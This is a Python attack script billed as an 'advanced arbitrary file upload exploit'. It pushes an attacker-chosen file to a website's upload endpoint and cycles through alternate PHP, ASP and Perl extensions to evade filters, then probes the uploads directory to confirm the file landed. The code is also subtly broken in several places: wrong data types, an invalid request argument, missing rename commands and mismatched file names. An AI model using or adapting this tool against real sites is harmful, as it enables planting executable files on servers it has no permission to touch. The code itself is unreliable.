#!/usr/bin/python3
#   This exploit, exploits almost every website with an uploads directory
#       an advanced arbitrary file upload exploit
#           exploit made by: fancy
# __________________________________________________________________________________________________________________

import requests
import subprocess
import sys
import pathlib

red = '\033[38;2;255;0;0m\033m'
end = '\033[m'


class FileUploadBypass(object):
    def __init__(self, file_accept_param, uploads_directory, url, file_to_upload):
        self.file_accept_param = file_accept_param
        self.uploads_directory = uploads_directory
        self.file_to_upload = file_to_upload
        self.url = url

    def php_upload_bypass(self):
        extension = pathlib.Path(self.file_to_upload)
        off_file = open(self.file_to_upload, "r")
        og = "PoCogentHHAsSZxCR8uIdONevB0S1dRdIInfKRzNbKahVoCXom3dpdEeriePZqfzbya2YgpdvtGuCG7azSCUvU0"
        php_file = "PoCogentHHAsSZxCR8uIdONevB0S1dRdIInfKRzNbKahVoCXom3dpdEeriePZqfzbya2YgpdvtGuCG7azSCUvU0" + extension
        hash_file = open(php_file, "w+")
        hash_file.write(off_file.read())

        try:
            file = {self.file_accept_param, open(php_file, "rb")}
            response = requests.post(self.url, files=file, allow_redirect=True)
            test_if_success = requests.get(self.uploads_directory + f"/{self.file_to_upload}")
            if test_if_success.status_code == 200:
                print(
                    f"[{red} UPLOAD SUCCESS FILE LOCATION {response}: \n {self.uploads_directory}/{php_file} {end}]")

            else:
                subprocess.call(f"mv {php_file} {og}.phtml", shell=True)
                file = {self.file_accept_param, open(og + ".phtml", "rb")}
                response = requests.post(self.url, files=file, allow_redirect=True)
                test_if_success = requests.get(self.uploads_directory + f"/{og}.phtml")
                if test_if_success.status_code == 200:
                    print(
                        f"[{red} UPLOAD SUCCESS FILE LOCATION {response}: \n {self.uploads_directory}/{og}.phtml {end}]")
                else:
                    subprocess.call(f"mv {og}.phtml {og}.php3", shell=True)
                    file = {self.file_accept_param, open(og + ".php3", "rb")}
                    response = requests.post(self.url, files=file, allow_redirect=True)
                    test_if_success = requests.get(self.uploads_directory + f"/{og}.php3")
                    if test_if_success.status_code == 200:
                        print(
                            f"[{red} UPLOAD SUCCESS FILE LOCATION {response}: \n {self.uploads_directory}/{og}.php3 {end}]")
                    else:
                        subprocess.call(f"mv {og}.php3 {og}.php4", shell=True)
                        file = {self.file_accept_param, open(og + ".php4", "rb")}
                        response = requests.post(self.url, files=file, allow_redirect=True)
                        test_if_success = requests.get(self.uploads_directory + f"/{og}.php4")
                        if test_if_success.status_code == 200:
                            print(
                                f"[{red} UPLOAD SUCCESS FILE LOCATION {response}: \n {self.uploads_directory}/{og}.php4 {end}]")
                        else:
                            subprocess.call(f"mv {og}.php4 {og}.php5", shell=True)
                            file = {self.file_accept_param, open(og + ".php5", "rb")}
                            response = requests.post(self.url, files=file, allow_redirect=True)
                            test_if_success = requests.get(self.uploads_directory + f"/{og}.php5")
                            if test_if_success.status_code == 200:
                                print(
                                    f"[{red} UPLOAD SUCCESS FILE LOCATION {response}: \n {self.uploads_directory}/{og}.php5 {end}]")
                            else:
                                subprocess.call(f"mv {og}.php5 {og}.php.jpg", shell=True)
                                file = {self.file_accept_param, open(og + ".php.jpg", "rb")}
                                response = requests.post(self.url, files=file, allow_redirect=True)
                                test_if_success = requests.get(self.uploads_directory + f"/{og}.php.jpg")
                                if test_if_success.status_code == 200:
                                    print(
                                        f"[{red} UPLOAD SUCCESS FILE LOCATION {response}: \n {self.uploads_directory}/{og}.php.jpg {end}]")
                                else:
                                    subprocess.call(f"mv {og}.php.jpg {og}.phpPHp", shell=True)
                                    file = {self.file_accept_param, open(og + ".PHp", "rb")}
                                    response = requests.post(self.url, files=file, allow_redirect=True)
                                    test_if_success = requests.get(self.uploads_directory + f"/{og}.PHp")
                                    if test_if_success.status_code == 200:
                                        print(
                                            f"[{red} UPLOAD SUCCESS FILE LOCATION {response}: \n {self.uploads_directory}/{og}.PHp {end}]")
                                    else:
                                        exit(f"[{red}FAILED{end}]")

        except (requests.exceptions.ConnectionError, requests.exceptions.InvalidURL,
                requests.exceptions.HTTPError, requests.exceptions.TooManyRedirects) as requests_error:
            print(f"\n{requests_error}")

    def asp_upload_bypass(self):
        extension = pathlib.Path(self.file_to_upload)
        off_file = open(self.file_to_upload, "r")
        og = "WAXArPD0Btn28MG0amQJ3whCjVhEDpAkUmw4gwYVBq"
        asp_file = "WAXArPD0Btn28MG0amQJ3whCjVhEDpAkUmw4gwYVBq" + extension
        hash_file = open(asp_file, "w+")
        hash_file.write(off_file.read())

        try:
            file = {self.file_accept_param, open(self.file_to_upload, "rb")}
            response = requests.post(self.url, files=file, allow_redirect=True)
            test_if_success = requests.get(self.uploads_directory + f"/{self.file_to_upload}")
            if test_if_success.status_code == 200:
                print(
                    f"[{red} UPLOAD SUCCESS FILE LOCATION {response}: \n {self.uploads_directory}/{self.file_to_upload} {end}]")
            else:
                subprocess.call("mv " + self.file_to_upload + f" {og}.aspx")
                file = {self.file_accept_param, open(og + ".aspx", "rb")}
                response = requests.post(self.url, files=file, allow_redirect=True)
                test_if_success = requests.get(self.uploads_directory + f"/{og}.aspx")
                if test_if_success.status_code == 200:
                    print(
                        f"[{red} UPLOAD SUCCESS FILE LOCATION {response}: \n {self.uploads_directory}/{og}.aspx {end}]")
                else:
                    exit(f"[{red}FAILED{end}]")

        except (requests.exceptions.ConnectionError, requests.exceptions.InvalidURL,
                requests.exceptions.HTTPError, requests.exceptions.TooManyRedirects) as requests_error:
            print(f"\n{requests_error}")

    def perl_upload_bypass(self):
        extension = pathlib.Path(self.file_to_upload)
        try:
            off_file = open(self.file_to_upload, "r")
            og = "WaYi2ysJAMIdLnS1aFc4KVneJ3C7curacyGkGWEzsICAAudits7RLl3HD4yw3UWjF5ktdP2nG2CPJ9jbc"
            perl_hash = "WaYi2ysJAMIdLnS1aFc4KVneJ3C7curacyGkGWEzsICAAudits7RLl3HD4yw3UWjF5ktdP2nG2CPJ9jbc" + extension
            hash_file = open(perl_hash, "w+")
            hash_file.write(off_file.read())

            file = {self.file_accept_param: open(self.file_to_upload, "rb")}
            response = requests.post(self.url, files=file, allow_redirect=True)
            test_if_success = requests.get(self.uploads_directory + f"/{self.file_to_upload}")
            if test_if_success.status_code == 200:
                print(
                    f"[{red} UPLOAD SUCCESS FILE LOCATION {response}: \n {self.uploads_directory}/{self.file_to_upload} {end}]")
            else:
                subprocess.call(f"{perl_hash} {og}.pm", shell=True)
                file = {self.file_accept_param: open(og + ".pm", "rb")}
                response = requests.post(self.url, files=file, allow_redirect=True)
                test_if_success = requests.get(self.uploads_directory + f"/{self.file_to_upload}")
                if test_if_success.status_code == 200:
                    print(
                        f"[{red} UPLOAD SUCCESS FILE LOCATION {response}: \n {self.uploads_directory}/{og}.pm {end}]")
                else:
                    subprocess.call(f"{og}.pm {og}.cgi", shell=True)
                    file = {self.file_accept_param: open(og + ".cgi", "rb")}
                    response = requests.post(self.url, files=file, allow_redirect=True)
                    test_if_success = requests.get(self.uploads_directory + f"/{self.file_to_upload}")
                    if test_if_success.status_code == 200:
                        print(
                            f"[{red} UPLOAD SUCCESS FILE LOCATION {response}: \n {self.uploads_directory}/{og}.cgi {end}]")
                    else:
                        subprocess.call(f"{og}.cgi {og}.lib", shell=True)
                        file = {self.file_accept_param: open(og + ".lib", "rb")}
                        response = requests.post(self.url, files=file, allow_redirect=True)
                        test_if_success = requests.get(self.uploads_directory + f"/{self.file_to_upload}")
                        if test_if_success.status_code == 200:
                            print(
                                f"[{red} UPLOAD SUCCESS FILE LOCATION {response}: \n {self.uploads_directory}/{og}.lib {end}]")
                        else:
                            exit(f"[{red}FAILED{end}]")

        except (requests.exceptions.ConnectionError, requests.exceptions.InvalidURL,
                requests.exceptions.HTTPError, requests.exceptions.TooManyRedirects) as requests_error:
            print(f"\n{requests_error}")


if __name__ == "__main__":
    try:
        attack = FileUploadBypass(
            file_to_upload=sys.argv[2],
            uploads_directory=sys.argv[3],
            url=sys.argv[4],
            file_accept_param=sys.argv[5]
        )
        CHOICE = sys.argv[1]

        if CHOICE == "PHP" or CHOICE == "php":
            attack.php_upload_bypass()
        elif CHOICE == "ASP" or CHOICE == "asp":
            attack.asp_upload_bypass()
        elif CHOICE == "PERL" or CHOICE == "perl":
            attack.perl_upload_bypass()
        else:
            exit("ERROR YOU DID NOT RUN THIS RIGHT")

    except IndexError:
        print(f"""
{sys.argv[0]} usage: 
    python3 {sys.argv[0]} <CHOICE> <file_to_upload> <FULL URL TO uploads directory> <url to the upload file location> <file_accept_param>
options: 
    php/PHP
    ASP/asp
    PERL/perl""".lower())
